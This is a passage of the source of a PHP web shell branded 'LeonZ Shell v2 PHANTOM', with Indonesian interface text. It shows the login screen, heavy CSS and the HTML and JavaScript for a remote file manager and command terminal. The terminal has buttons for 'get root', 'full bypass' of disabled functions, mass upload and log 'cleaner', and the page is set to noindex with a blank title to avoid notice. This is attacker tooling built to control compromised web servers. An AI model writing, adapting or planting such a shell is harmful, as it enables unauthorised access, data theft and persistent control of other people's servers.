 radial-gradient(600px 300px at 25% 10%,rgba(255,45,77,.12),transparent 60%),
 radial-gradient(500px 400px at 85% 90%,rgba(120,20,40,.14),transparent 65%);pointer-events:none}
.glass{background:rgba(13,6,9,.85);backdrop-filter:blur(18px);border:1px solid rgba(255,45,77,.25);border-radius:18px;padding:38px 34px;width:min(360px,92vw);box-shadow:0 20px 60px rgba(0,0,0,.65),0 0 40px rgba(255,45,77,.12);position:relative;z-index:2}
.glass::after{content:'';position:absolute;top:0;left:8%;right:8%;height:1px;background:linear-gradient(90deg,transparent,#ff2d4d,transparent);opacity:.8}
.logo{font-family:'Cascadia Code',Consolas,monospace;font-size:22px;font-weight:700;letter-spacing:2px;text-align:center;background:linear-gradient(90deg,#ff2d4d,#ff7b45);-webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:4px;text-shadow:0 0 25px rgba(255,45,77,.4)}
.sub{font-size:11px;color:#8a6565;text-align:center;letter-spacing:3px;text-transform:uppercase;margin-bottom:26px}
.field{margin-bottom:14px}
.field input{width:100%;background:rgba(255,45,77,.04);border:1px solid rgba(255,45,77,.15);border-radius:10px;padding:12px 14px;color:#f0e2e2;font-size:14px;transition:.2s;outline:none}
.field input:focus{border-color:#ff2d4d;box-shadow:0 0 0 3px rgba(255,45,77,.14)}
button{width:100%;background:linear-gradient(135deg,#ff2d4d,#c40f2e);color:#fff;border:none;border-radius:10px;padding:13px;font-weight:700;font-size:14px;cursor:pointer;transition:.2s;letter-spacing:1px;box-shadow:0 4px 20px rgba(255,45,77,.3)}
button:hover{filter:brightness(1.15);transform:translateY(-1px)}
.err{color:#ff5c6c;font-size:12px;text-align:center;margin-top:12px;min-height:16px}
.hint{color:#5d4545;font-size:10px;text-align:center;margin-top:18px;font-family:monospace}
</style>
</head>
<body>
<div class="glass">
  <div class="logo">PHANTOM</div>
  <div class="sub">shell v2</div>
  <?php if (!empty($LOGIN_ERR)): ?><div class="err"><?= h($LOGIN_ERR) ?></div><?php endif; ?>
  <form method="post" autocomplete="off">
    <div class="field"><input name="u" placeholder="user" autofocus required></div>
    <div class="field"><input name="p" type="password" placeholder="••••••••" required <?= $locked ? 'disabled' : '' ?>></div>
    <button type="submit" <?= $locked ? 'disabled' : '' ?>><?= $locked ? 'LOCKED' : 'AUTHENTICATE' ?></button>
  </form>
  <div class="hint">secured session · ip <?= h(client_ip()) ?></div>
</div>
</body>
</html>
    <?php
    exit;
}


$ROOT = detect_root();


$SHELL_HOME = $SHELL_DIR;
$CWD = $_SESSION['cwd'] ?? $SHELL_HOME;
if (!is_dir($CWD)) $CWD = $ROOT;
$CSRF = csrf_token();
$BYP = bypass_active();
$uname_short = php_uname('s') . ' ' . php_uname('n');
$phpv = PHP_VERSION;
$diskfree = bytes((int)@disk_free_space($CWD));
$who = @get_current_user() ?: '?';
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>·</title>
<style>
:root{
 --bg:#0b0509;--panel:rgba(22,10,16,.82);--panel2:rgba(15,7,11,.94);
 --line:rgba(255,80,90,.10);--line2:rgba(255,80,90,.35);
 --tx:#eaddd8;--tx2:#a88f8a;--tx3:#6e5852;
 --acc:#ff2d4d;--acc2:#ff7b45;--gold:#f5c86b;--grn:#57d98a;--warn:#ffc44d;--err:#ff4d5e;
 --acc-glow:rgba(255,45,77,.45);
 --mono:'Cascadia Code','Consolas','Courier New',monospace;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{background:var(--bg);color:var(--tx);font-family:'Segoe UI',system-ui,sans-serif;font-size:13px;overflow-y:auto}

body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background:
 linear-gradient(rgba(255,45,77,.025) 1px,transparent 1px),
 linear-gradient(90deg,rgba(255,45,77,.025) 1px,transparent 1px);
 background-size:38px 38px}
body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background:
 radial-gradient(800px 460px at 15% -3%,rgba(255,45,77,.10),transparent 62%),
 radial-gradient(760px 560px at 92% 105%,rgba(140,25,50,.14),transparent 66%),
 radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,.55) 100%)}
::-webkit-scrollbar{width:9px;height:9px}
::-webkit-scrollbar-thumb{background:#3a1620;border-radius:6px}
::-webkit-scrollbar-thumb:hover{background:#5c1f2e}


.hdr{background:var(--panel2);backdrop-filter:blur(14px);border-bottom:1px solid var(--line2);padding:12px 18px 10px;position:relative;z-index:5}
.hdr::after{content:'';position:absolute;bottom:0;left:5%;right:5%;height:1px;background:linear-gradient(90deg,transparent,rgba(255,45,77,.55),rgba(245,200,107,.4),rgba(255,45,77,.55),transparent)}
.hdr-top{display:flex;align-items:center;gap:14px}
.brand-big{font-family:var(--mono);font-size:26px;font-weight:800;letter-spacing:4px;background:linear-gradient(100deg,#ff2d4d 20%,#f5c86b 50%,#ff2d4d 80%);background-size:200% auto;-webkit-background-clip:text;background-clip:text;color:transparent;filter:drop-shadow(0 0 14px rgba(255,45,77,.45));animation:shine 6s linear infinite}
@keyframes shine{to{background-position:200% center}}
.brand-sub{font-size:10px;letter-spacing:3px;color:var(--tx2);display:block;margin-top:2px;font-weight:400;-webkit-text-fill-color:var(--tx2)}
.hdr-info{display:flex;gap:8px;margin-top:9px;flex-wrap:wrap}
.badge{font-size:10px;padding:3px 10px;border-radius:20px;border:1px solid var(--line);color:var(--tx2);font-family:var(--mono)}
.badge.by{border-color:var(--err);color:#ff6b7d;box-shadow:0 0 12px rgba(255,45,77,.4);animation:pulse 1.6s infinite}
.badge.ok{border-color:rgba(87,217,138,.4);color:var(--grn)}
@keyframes pulse{50%{opacity:.5}}
.spacer{flex:1}
.btn-ghost{background:transparent;border:1px solid var(--line);color:var(--tx2);padding:6px 13px;border-radius:8px;cursor:pointer;font-size:12px;transition:.15s}
.btn-ghost:hover{border-color:var(--acc);color:#ff6b7d}


.wrap{position:relative;z-index:2;padding:0 14px}


.crumbbar{display:flex;align-items:center;gap:8px;padding:9px 2px;flex-wrap:nowrap}
.cb-label{color:var(--gold);font-size:14px;white-space:nowrap}
.crumb{font-family:var(--mono);font-size:12px;color:#ff8494;background:transparent;border:none;cursor:pointer;padding:2px 5px;border-radius:4px}
.crumb:hover{background:rgba(255,45,77,.14);text-decoration:underline}
.crumb-sep{color:var(--tx3);font-size:11px;opacity:.7}
.nbtn{font-family:var(--mono);font-size:11px;cursor:pointer;transition:.15s;white-space:nowrap;padding:5px 13px;border-radius:18px}
.nbtn.home{background:linear-gradient(135deg,rgba(245,200,107,.22),rgba(245,200,107,.05));border:1px solid rgba(245,200,107,.55);color:var(--gold);font-weight:700;letter-spacing:1px;text-shadow:0 0 10px rgba(245,200,107,.5)}
.nbtn.home:hover{box-shadow:0 0 14px rgba(245,200,107,.35);filter:brightness(1.15)}
.nbtn.up{background:rgba(255,45,77,.06);border:1px solid var(--line);color:var(--tx2)}
.nbtn.up:hover{color:#ff6b7d;border-color:var(--line2)}
.nbtn.rf{background:rgba(255,45,77,.06);border:1px solid var(--line);color:var(--tx2);padding:5px 11px}
.nbtn.rf:hover{color:#ff6b7d;border-color:var(--line2)}


.qcpanel{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:10px 12px;margin-bottom:12px;box-shadow:0 4px 18px rgba(0,0,0,.35)}
.qc-title{font-family:var(--mono);font-size:11px;letter-spacing:2px;color:var(--gold);margin-bottom:9px;text-transform:uppercase}
.qc-row{display:flex;gap:6px;flex-wrap:wrap}
.qc{background:rgba(255,45,77,.06);border:1px solid var(--line);color:#d8aeb0;padding:5px 13px;border-radius:18px;font-size:11.5px;cursor:pointer;font-family:var(--mono);transition:.15s}
.qc:hover{color:#ff6b7d;border-color:var(--line2);background:rgba(255,45,77,.14);box-shadow:0 0 10px rgba(255,45,77,.25)}
.qc.grn{color:var(--grn);border-color:rgba(87,217,138,.35)}
.qc.grn:hover{background:rgba(87,217,138,.1);box-shadow:0 0 10px rgba(87,217,138,.25)}
.qc.red{color:#ff6b7d;border-color:rgba(255,45,77,.45)}
.qc.red:hover{background:rgba(255,45,77,.16);box-shadow:0 0 12px rgba(255,45,77,.35)}


.termbar{display:flex;gap:10px;align-items:center;background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:10px 12px;margin-bottom:10px}
.tpfx{font-family:var(--mono);color:#ff6b7d;font-size:12.5px;white-space:nowrap;font-weight:600;text-shadow:0 0 8px rgba(255,45,77,.5)}
.termbar input{flex:1;background:rgba(0,0,0,.35);border:1px solid var(--line);border-radius:8px;padding:10px 13px;color:#f0e2e2;font-family:var(--mono);font-size:13px;outline:none;transition:.15s}
.termbar input::placeholder{color:#8a6565}
.termbar input:focus{border-color:rgba(255,45,77,.5);box-shadow:0 0 12px rgba(255,45,77,.15)}
.run{background:linear-gradient(135deg,#f5c86b,#e8a84b);color:#2b1a05;border:none;border-radius:8px;padding:10px 22px;font-weight:800;font-size:12.5px;cursor:pointer;font-family:var(--mono);letter-spacing:1px;transition:.15s;box-shadow:0 3px 14px rgba(245,200,107,.25)}
.run:hover{filter:brightness(1.12);transform:translateY(-1px)}
.term-out{max-height:290px;overflow-y:auto;background:rgba(8,3,6,.75);border:1px solid var(--line);border-radius:10px;padding:12px 14px;font-family:var(--mono);font-size:12.5px;line-height:1.6;white-space:pre-wrap;word-break:break-all;color:#f0e2e2;margin-bottom:12px}
.term-out .ln{padding:1px 0}
.term-out .err{color:#ff6b7d}
.term-out .ok{color:#ff8494}
.term-out .warn{color:var(--warn)}
.term-out .info{color:#ff9d6e}


.ftools{display:flex;align-items:center;gap:8px;padding:10px 0;flex-wrap:wrap}
.ft-sep{width:1px;height:22px;background:var(--line)}
.btn.up{background:linear-gradient(135deg,rgba(255,45,77,.2),rgba(255,123,69,.08));border-color:rgba(255,45,77,.45);color:#ff8494}
.btn{background:rgba(255,45,77,.05);border:1px solid var(--line);color:var(--tx);padding:5px 11px;border-radius:7px;cursor:pointer;font-size:12px;transition:.15s;white-space:nowrap;font-family:var(--mono)}
.btn:hover{border-color:var(--acc);color:#ff6b7d;box-shadow:0 0 8px rgba(255,45,77,.2)}
.btn.acc{background:linear-gradient(135deg,rgba(255,45,77,.16),rgba(255,123,69,.08));border-color:rgba(255,45,77,.4);color:#ff8494}
.btn.danger:hover{border-color:var(--err);color:var(--err)}
.ftable-wrap{overflow-x:auto;background:var(--panel);border:1px solid var(--line);border-radius:12px;margin-bottom:4px}
table{width:100%;border-collapse:collapse;font-size:12.5px}
thead th{position:sticky;top:0;background:rgba(20,9,14,.97);text-align:left;padding:9px 10px;color:var(--gold);font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid var(--line2);cursor:pointer;user-select:none}
tbody td{padding:6px 10px;border-bottom:1px solid rgba(255,255,255,.03)}
tbody tr:hover{background:rgba(255,45,77,.05)}
tbody tr.sel{background:rgba(255,45,77,.12)}
.fname{color:#f0e2e2;cursor:pointer;display:flex;align-items:center;gap:7px;font-size:13px}
.fname:hover{color:#ff5c6c}
.fname .ic{width:15px;text-align:center;opacity:.9}
td.dirn .fname{color:#ff9d6e;font-weight:600}
.prot{color:var(--warn);font-size:10px}
.fsize{font-family:var(--mono);color:#a9bcd4;font-size:11.5px;text-align:right;white-space:nowrap}
.fperm{font-family:var(--mono);font-size:11.5px;color:var(--grn)}
.fact{white-space:nowrap;font-size:11.5px}
.fact button{background:transparent;border:none;cursor:pointer;padding:1px 5px;font-size:11.5px;border-radius:4px;color:var(--gold);font-family:var(--mono)}
.fact button:hover{color:#fff;text-decoration:underline}
.fact button.del{color:#ff8494}
.fact button.del:hover{color:#ff4d5e}
.bulkbar{display:none;align-items:center;gap:8px;padding:8px 14px;background:rgba(255,45,77,.08);border-top:1px solid var(--line2)}
.bulkbar.show{display:flex}
.dropzone{margin:10px 14px;border:2px dashed var(--line2);border-radius:10px;padding:14px;text-align:center;color:var(--tx2);font-size:12px;cursor:pointer;transition:.2s}
.dropzone:hover,.dropzone.drag{border-color:var(--acc);color:#ff5c6c;background:rgba(255,45,77,.06)}


.qcmds{display:flex;gap:6px;flex-wrap:wrap;padding:9px 14px;border-bottom:1px solid var(--line);background:rgba(10,4,7,.7);align-items:center}
.qc{background:rgba(255,45,77,.06);border:1px solid var(--line);color:#d8a8a8;padding:5px 13px;border-radius:6px;font-size:12px;cursor:pointer;font-family:var(--mono);transition:.15s}
.qc:hover{color:#ff5c6c;border-color:var(--line2);background:rgba(255,45,77,.12);box-shadow:0 0 10px rgba(255,45,77,.25)}
.qc.red{color:#ff5c6c;border-color:rgba(255,45,77,.45)}
.qc.red:hover{background:rgba(255,45,77,.15);box-shadow:0 0 12px rgba(255,45,77,.35)}
.term-out{flex:1;overflow-y:auto;padding:12px 14px;font-family:var(--mono);font-size:13px;line-height:1.6;white-space:pre-wrap;word-break:break-all;min-height:0;color:#f0e2e2}
.term-out .ln{padding:1px 0}
.term-out .err{color:#ff5c6c}
.term-out .ok{color:#ff8494}
.term-out .warn{color:#ffc44d}
.term-out .info{color:#ff9d6e}
.prompt{display:flex;gap:10px;padding:10px 14px;border-top:1px solid var(--line);background:var(--panel2);align-items:center}
.prompt .pfx{font-family:var(--mono);color:#ff5c6c;font-size:13px;white-space:nowrap;font-weight:600;text-shadow:0 0 8px rgba(255,45,77,.5)}
.prompt input{flex:1;background:rgba(255,45,77,.04);border:1px solid var(--line);border-radius:8px;padding:11px 13px;color:#f0e2e2;font-family:var(--mono);font-size:13.5px;outline:none;transition:.15s}
.prompt input::placeholder{color:#8a6565}
.prompt input:focus{border-color:rgba(255,45,77,.5);box-shadow:0 0 12px rgba(255,45,77,.15)}


.modal-bg{position:fixed;inset:0;background:rgba(2,4,10,.7);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:100}
.modal-bg.show{display:flex}
.modal{background:var(--panel2);border:1px solid var(--line2);border-radius:14px;width:min(860px,94vw);max-height:88vh;display:flex;flex-direction:column;box-shadow:0 30px 80px rgba(0,0,0,.7)}
.modal-h{display:flex;align-items:center;gap:10px;padding:12px 16px;border-bottom:1px solid var(--line)}
.modal-h b{font-family:var(--mono);color:var(--acc);font-size:13px}
.modal-h .x{margin-left:auto;cursor:pointer;color:var(--tx2);font-size:18px;padding:0 6px}
.modal-h .x:hover{color:var(--err)}
.modal-b{flex:1;overflow:auto;padding:14px 16px;min-height:0}
.modal-b img{max-width:100%;border-radius:8px;display:block;margin:0 auto}
.modal-b pre{font-family:var(--mono);font-size:12.5px;white-space:pre-wrap;word-break:break-all;line-height:1.5;color:var(--tx)}
.modal-b textarea{width:100%;min-height:46vh;background:rgba(255,255,255,.04);border:1px solid var(--line);border-radius:8px;padding:12px;color:var(--tx);font-family:var(--mono);font-size:12.5px;outline:none;resize:vertical}
.modal-b textarea:focus{border-color:rgba(255,45,77,.45)}
.modal-f{display:flex;gap:8px;padding:12px 16px;border-top:1px solid var(--line);justify-content:flex-end}
.toast{position:fixed;bottom:20px;right:20px;background:var(--panel2);border:1px solid var(--line2);border-radius:10px;padding:11px 18px;color:#ff8494;font-family:var(--mono);font-size:12px;z-index:200;opacity:0;transform:translateY(8px);transition:.25s;pointer-events:none;box-shadow:0 0 20px rgba(255,45,77,.25)}
.toast.show{opacity:1;transform:none}
.toast.bad{color:#ff5c6c;border-color:rgba(255,45,77,.5)}
.stat{font-family:var(--mono);font-size:10.5px;color:var(--tx3)}
input.inp,select.inp{background:rgba(255,255,255,.04);border:1px solid var(--line);border-radius:8px;padding:8px 10px;color:var(--tx);font-size:12px;outline:none;font-family:var(--mono)}
</style>
</head>
<body>


<div class="hdr">
  <div class="hdr-top">
    <div class="brand-big">LEONZ<span class="brand-sub">SHELL v2 · PHANTOM</span></div>
    <div class="spacer"></div>
    <span class="badge by" id="bypBadge" style="<?= $BYP ? '' : 'display:none' ?>">⚠ BYPASS AKTIF</span>
    <button class="btn-ghost" onclick="location.href='?logout=1'">LOGOUT</button>
  </div>
  <div class="hdr-info">
    <span class="badge">⌗ <?= h($uname_short) ?></span>
    <span class="badge">PHP <?= h($phpv) ?></span>
    <span class="badge">user: <?= h($who) ?></span>
    <span class="badge">HDD <?= h($diskfree) ?></span>
    <span class="badge ok" id="accBadge">MODE: <?= strtoupper($ACCESS) ?> ACCESS</span>
  </div>
</div>

<div class="wrap">


  <div class="crumbbar">
    <button class="nbtn home" onclick="loadDir(HOME)" title="kembali ke folder shell">HOME</button>
    <button class="nbtn up" onclick="goUp()" title="naik 1 level">⬆ UP</button>
    <button class="nbtn rf" onclick="loadDir(CWD)" title="refresh">⟳</button>
    <span class="cb-label">📁</span>
    <div id="crumb" style="flex:1;overflow-x:auto;white-space:nowrap;min-width:80px"></div>
  </div>


  <div class="qcpanel">
    <div class="qc-title">⚡ QUICK COMMANDS</div>
    <div class="qc-row">
      <button class="qc" onclick="qrun('help')">help</button>
      <button class="qc" onclick="qrun('pwd')">pwd</button>
      <button class="qc" onclick="qrun('ls')">ls</button>
      <button class="qc" onclick="qrun('status')">status</button>
      <button class="qc" onclick="qrun('perms')">perms</button>
      <button class="qc grn" onclick="qrun('getroot')">get root</button>
      <button class="qc" onclick="qrun('disabled')">disabled funcs</button>
      <button class="qc" onclick="qrun('ps')">process</button>
      <button class="qc" onclick="qrun('netstat')">network</button>
      <button class="qc" onclick="qrun('df')">disk</button>
      <button class="qc" onclick="qrun('cpanel')">cpanel url</button>
      <button class="qc" onclick="qrun('baseline')">baseline</button>
      <button class="qc" onclick="qrun('audit')">audit</button>
      <button class="qc grn" onclick="qrun('shellcheck')">shell check</button>
      <button class="qc grn" onclick="qrun('cleaner')">cleaner</button>
      <button class="qc" onclick="qrun('massupload')">massupload</button>
      <button class="qc red" onclick="qrunPrompt('bypass')">full bypass</button>
      <button class="qc red" onclick="qrunPrompt('unbypass')">unbypass</button>
    </div>
  </div>


  <div class="termbar">
    <span class="tpfx" id="pfx">~$</span>
    <input id="termIn" placeholder="ketik perintah… (help / cleaner / massupload / bypass)" autocomplete="off" spellcheck="false">
    <button class="run" onclick="runCmd(termIn.value.trim()); tprint(`${CWD.replace(/\\/g,'/')} $ ${termIn.value}`,'info'); termIn.value='';">RUN</button>
  </div>
  <div class="term-out" id="termOut"><div class="ln info">LeonZ Shell v2 "PHANTOM" — ketik <b>help</b> untuk daftar perintah.</div></div>


  <div class="ftools">
    <button class="btn up" onclick="uiUpload()">⬆ UPLOAD</button>
    <input type="file" id="fileInput" multiple style="display:none">
    <span class="ft-sep"></span>
    <input class="inp" id="nfName" placeholder="new file name…" style="width:150px">
    <button class="btn" onclick="uiNewFileName()">+ FILE</button>
    <span class="ft-sep"></span>
    <input class="inp" id="ndName" placeholder="new folder name…" style="width:150px">
    <button class="btn" onclick="uiNewDirName()">+ FOLDER</button>
    <span class="spacer"></span>
    <button class="btn" onclick="uiMassUpload()">⇈ Mass Upload</button>
    <button class="btn" onclick="uiCleaner()">🛡 Cleaner</button>
  </div>


  <div class="bulkbar" id="bulkbar">
    <span id="bulkCount" style="color:var(--gold);font-family:var(--mono)">0</span>
    <span style="color:var(--tx2);font-size:11px">dipilih</span>
    <button class="btn danger" onclick="bulkAction('delete')">Delete</button>
    <button class="btn" onclick="bulkAction('zip')">Zip</button>
    <button class="btn" onclick="bulkAction('chmod',prompt('Mode oktal (mis. 644):','644')||'')">Chmod</button>
    <button class="btn-ghost" onclick="clearSel()">Batal</button>
  </div>


  <div class="ftable-wrap">
    <table>
      <thead><tr>
        <th style="width:26px"><input type="checkbox" id="selAll" onchange="selAll(this)"></th>
        <th onclick="sortTbl('name')"><?= strtoupper('Name') ?></th>
        <th style="width:86px;text-align:right" onclick="sortTbl('size')"><?= strtoupper('Size') ?></th>
        <th style="width:120px" onclick="sortTbl('mtime')"><?= strtoupper('Modified') ?></th>
        <th style="width:60px" onclick="sortTbl('perm')"><?= strtoupper('Perm') ?></th>
        <th style="width:190px"><?= strtoupper('Actions') ?></th>
      </tr></thead>
      <tbody id="ftbody"><tr><td colspan="6" style="padding:26px;color:var(--tx3)">Memuat…</td></tr></tbody>
    </table>
  </div>
</div>
<div class="dropzone" id="dropzone" style="margin:10px 14px 14px">⬆ Drop file di sini / klik untuk upload</div>


<div class="modal-bg" id="modalBg" onclick="if(event.target===this)closeModal()">
  <div class="modal">
    <div class="modal-h"><b id="mTitle">—</b><span class="x" onclick="closeModal()">×</span></div>
    <div class="modal-b" id="mBody"></div>
    <div class="modal-f" id="mFoot"></div>
  </div>
</div>
<div class="toast" id="toast"></div>

<script>
const CSRF  = <?= json_encode($CSRF) ?>;
const HOME  = <?= json_encode($SHELL_HOME) ?>;
let CWD    = <?= json_encode($CWD) ?>;
let CURRENT = [];
let SELECTED = new Set();
let history = [], histIdx = -1;
const $ = id => document.getElementById(id);


function toast(msg, bad) {
  const t = $('toast');
  t.textContent = msg;
  t.className = 'toast show' + (bad ? ' bad' : '');
  setTimeout(() => t.classList.remove('show'), 2600);
}
async function api(payload, isGet) {
  const fd = new FormData();
  for (const k in payload) if (payload[k] !== undefined) fd.append(k, payload[k]);
  fd.append('csrf', CSRF);
  const r = await fetch('?ajax=1' + (isGet ? '&' + new URLSearchParams(isGet).toString() : ''), {
    method: 'POST', body: fd,
    headers: {'X-Requested-With': 'XMLHttpRequest'},
  });
  return r.json();
}
function esc(s) { const d = document.createElement('div'); d.textContent = s ?? ''; return d.innerHTML; }


async function loadDir(dir) {
  const r = await api({act: 'list', dir});
  if (!r.ok) { toast(r.out, true); return; }
  CWD = r.dir; CURRENT = r.items;
  $('bypBadge').style.display = r.bypass ? '' : 'none';
  renderCrumb(r.dir, r.parent);
  renderTbl();
}
function renderCrumb(dir, parent) {


  const sep = dir.includes('/') ? '/' : '\\';
  const parts = dir.split(/[\\/]/).filter(Boolean);
  let acc = '', html = '';
  if (dir.startsWith('/')) acc = '/';
  else if (/^[A-Za-z]:/.test(parts[0] || '')) { acc = parts.shift() + '\\'; }
  else acc = parts.shift() + sep;
  for (const p of parts) {
    acc = (acc.endsWith('/') || acc.endsWith('\\')) ? acc + p : acc + sep + p;
    const safe = acc.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
    html += `<button class="crumb" onclick="loadDir('${safe}')" title="${esc(acc)}">${esc(p)}</button><span class="crumb-sep">›</span>`;
  }
  const rootLabel = acc === '/' ? '/' : acc;
  const safeRoot = rootLabel.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
  html = `<button class="crumb" onclick="loadDir('${safeRoot}')" title="${esc(rootLabel)}">${esc(rootLabel)}</button><span class="crumb-sep">›</span>` + html;
  $('crumb').innerHTML = html;
}
let sortKey = 'name', sortDir = 1;
function sortTbl(k) { if (sortKey === k) sortDir *= -1; else { sortKey = k; sortDir = 1; } renderTbl(); }
function renderTbl() {
  clearSel();
  const items = [...CURRENT].sort((a, b) => {
    if (a.isdir !== b.isdir) return b.isdir - a.isdir;
    let va = a[sortKey] ?? '', vb = b[sortKey] ?? '';
    if (sortKey === 'size') return (va - vb) * sortDir;
    return String(va).localeCompare(String(vb)) * sortDir;
  });
  let h = '';
  for (const it of items) {
    const p = it.name.replace(/'/g, "\\'");
    const full = (CWD.replace(/[\\/]+$/, '') + '/' + it.name).replace(/\\/g, '/');
    h += `<tr data-path="${esc(full)}">
      <td><input type="checkbox" onchange="selRow(this,'${esc(full)}')"></td>
      <td class="${it.isdir ? 'dirn' : ''}">
        <span class="fname" onclick="${it.isdir ? `loadDir('${full.replace(/'/g, "\\'")}')` : `uiView('${full.replace(/'/g, "\\'")}')`}">
          <span class="ic">${it.isdir ? '📁' : iconFor(it.name)}</span>${esc(it.name)}
          ${it.protected ? '<span class="prot">🔒</span>' : ''}
        </span></td>
      <td class="fsize">${it.isdir ? '—' : fmtSize(it.size)}</td>
      <td class="stat">${esc(it.mtime)}</td>
      <td class="fperm">${esc(it.perm)}</td>
      <td class="fact">
        <button title="view/edit" onclick="uiView('${full.replace(/'/g, "\\'")}')">Edit</button><span style="color:var(--tx3)">|</span>
        <button title="download" onclick="dl('${full.replace(/'/g, "\\'")}')">Dl</button><span style="color:var(--tx3)">|</span>
        <button title="rename" onclick="uiRename('${full.replace(/'/g, "\\'")}')">Rename</button><span style="color:var(--tx3)">|</span>
        <button title="chmod" onclick="uiChmod('${full.replace(/'/g, "\\'")}','${it.perm}')">Chmod</button><span style="color:var(--tx3)">|</span>
        <button title="zip" onclick="singleAction('zip','${full.replace(/'/g, "\\'")}')">Zip</button><span style="color:var(--tx3)">|</span>
        <button class="del" title="delete" onclick="uiDelete('${full.replace(/'/g, "\\'")}')">Del</button>
      </td></tr>`;
  }
  $('ftbody').innerHTML = h || '<tr><td colspan="6" style="padding:26px;color:var(--tx3)">Kosong</td></tr>';
}
function iconFor(n) {
  const e = n.split('.').pop().toLowerCase();
  if (['jpg','jpeg','png','gif','webp','svg','ico','bmp'].includes(e)) return '🖼';
  if (['zip','gz','tar','rar','7z'].includes(e)) return '🗜';
  if (['php','html','htm','js','css','json','xml'].includes(e)) return '📄';
  if (['mp4','mkv','avi','webm'].includes(e)) return '🎬';
  if (['mp3','wav','ogg'].includes(e)) return '🎵';
  if (['sql','db','sqlite'].includes(e)) return '🗄';
  if (['txt','md','log','ini','conf','env'].includes(e)) return '📃';
  return '▫';
}
function fmtSize(b) {
  if (b < 1024) return b + ' B';
  const u = ['KB','MB','GB'];
  let i = -1; do { b /= 1024; i++; } while (b >= 1024 && i < 2);
  return b.toFixed(1) + ' ' + u[i];
}
function goUp() { loadDir(CWD.replace(/[\\/][^\\/]*$/, '') || HOME); }
function selRow(cb, path) { cb.checked ? SELECTED.add(path) : SELECTED.delete(path); updateBulk(); }
function selAll(cb) { document.querySelectorAll('#ftbody input[type=checkbox]').forEach(c => { c.checked = cb.checked; c.checked ? SELECTED.add(c.closest('tr').dataset.path) : SELECTED.delete(c.closest('tr').dataset.path); }); updateBulk(); }
function clearSel() { SELECTED.clear(); $('bulkbar').classList.remove('show'); $('selAll').checked = false; document.querySelectorAll('#ftbody input[type=checkbox]').forEach(c => c.checked = false); }
function updateBulk() { $('bulkCount').textContent = SELECTED.size; $('bulkbar').classList.toggle('show', SELECTED.size > 0); }

async function bulkAction(op, mode) {
  if (!SELECTED.size) return;
  if (op === 'delete' && !confirm(`Hapus ${SELECTED.size} item?`)) return;
  const r = await api({act: 'action', op, mode, paths: [...SELECTED]});
  toast(r.ok ? 'Selesai' : r.out, !r.ok);
  loadDir(CWD);
}
async function singleAction(op, path) {
  const r = await api({act: 'action', op, paths: [path]});
  toast(r.ok ? 'Selesai' : r.out, !r.ok);
  loadDir(CWD);
}
function dl(path) { window.open('?ajax=1&act=download&path=' + encodeURIComponent(path) + '&csrf=' + encodeURIComponent(CSRF), '_blank'); }

function openModal(title, bodyHtml, footHtml) {
  $('mTitle').textContent = title;
  $('mBody').innerHTML = bodyHtml;
  $('mFoot').innerHTML = footHtml || '';
  $('modalBg').classList.add('show');
}
function closeModal() { $('modalBg').classList.remove('show'); }
async function uiView(path) {
  const r = await api({act: 'read', path});
  if (!r.ok) { toast(r.out, true); return; }
  if (r.type === 'image') {
    openModal(r.name, `<img src="?ajax=1&act=read&raw=1&path=${encodeURIComponent(r.path)}&csrf=${encodeURIComponent(CSRF)}" onerror="this.replaceWith(document.createTextNode('preview gagal'))">`,
      `<button class="btn" onclick="dl('${path.replace(/'/g, "\\'")}')">Download</button><button class="btn-ghost" onclick="closeModal()">Tutup</button>`);
  } else if (r.type === 'large') {
    openModal(r.name, `<pre>${esc(r.name)} — ${fmtSize(r.size)} (terlalu besar untuk preview, gunakan terminal 'cat')</pre>`,
      `<button class="btn" onclick="dl('${path.replace(/'/g, "\\'")}')">Download</button><button class="btn-ghost" onclick="closeModal()">Tutup</button>`);
  } else {
    openModal('Edit — ' + r.name,
      `<textarea id="editTa">${esc(r.content)}</textarea>
       <div class="stat" style="margin-top:8px">${esc(r.path)} · ${fmtSize(r.size)}</div>`,
      `<button class="btn acc" onclick="uiSave('${path.replace(/'/g, "\\'")}')">Simpan</button><button class="btn-ghost" onclick="closeModal()">Batal</button>`);
  }
}
async function uiSave(path) {
  const r = await api({act: 'save', path, content: $('editTa').value});
  if (r.ok) { toast(r.out); closeModal(); } else toast(r.out, true);
}
function uiDelete(path) {
  if (!confirm('Hapus: ' + path + ' ?')) return;
  singleAction('delete', path);
}
function uiRename(path) {
  const nn = prompt('Nama baru:', path.split(/[\\/]/).pop());
  if (!nn) return;
  api({act: 'action', op: 'rename', paths: [path], newname: nn}).then(r => { toast(r.ok ? 'Renamed' : r.out, !r.ok); loadDir(CWD); });
}
function uiChmod(path, cur) {
  const m = prompt('Mode oktal:', cur);
  if (!m) return;
  api({act: 'action', op: 'chmod', paths: [path], mode: m}).then(r => { toast(r.ok ? 'chmod ' + m : r.out, !r.ok); loadDir(CWD); });
}
function uiNewFile() {
  const n = prompt('Nama file baru:');
  if (!n) return;
  api({act: 'action', op: 'touch', paths: [CWD.replace(/[\\/]+$/, '') + '/' + n]}).then(r => { toast(r.ok ? 'Dibuat' : r.out, !r.ok); loadDir(CWD); });
}
function uiNewFileName() {
  const n = $('nfName').value.trim();
  if (!n) { toast('Isi nama file dulu', true); return; }
  api({act: 'action', op: 'touch', paths: [CWD.replace(/[\\/]+$/, '') + '/' + n]}).then(r => {
    toast(r.ok ? 'File dibuat: ' + n : r.out, !r.ok);
    if (r.ok) $('nfName').value = '';
    loadDir(CWD);
  });
}
function uiNewDirName() {
  const n = $('ndName').value.trim();
  if (!n) { toast('Isi nama folder dulu', true); return; }
  api({act: 'action', op: 'mkdir', paths: [CWD.replace(/[\\/]+$/, '') + '/' + n]}).then(r => {
